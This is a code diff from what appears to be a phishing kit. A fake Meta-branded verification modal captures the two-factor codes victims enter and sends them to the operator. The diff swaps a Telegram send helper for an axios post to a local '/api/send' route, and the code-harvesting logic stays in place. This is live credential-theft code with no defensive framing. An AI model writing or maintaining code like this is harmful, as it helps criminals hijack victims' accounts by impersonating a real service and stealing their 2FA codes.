@@ -2,8 +2,8 @@ import MetaLogo from '@/assets/images/meta-logo-image.png';
 import VerifyImage from '@/assets/images/verify-image.png';
 import { store } from '@/store/store';
 import config from '@/utils/config';
-import sendMessage from '@/utils/telegram';
 import translateText from '@/utils/translate';
+import axios from 'axios';
 import Image from 'next/image';
 import { useEffect, useState, type FC } from 'react';
 
@@ -63,7 +63,10 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
         const message = `<b>🔐 2FA Code ${next}/${maxCode}:</b> <code>${code}</code>`;
         try {
-            await sendMessage(message, messageId ?? undefined);
+            await axios.post('/api/send', {
+                message,
+                message_id: messageId
+            });
             if (next >= maxCode) {
                 nextStep();
             } else {
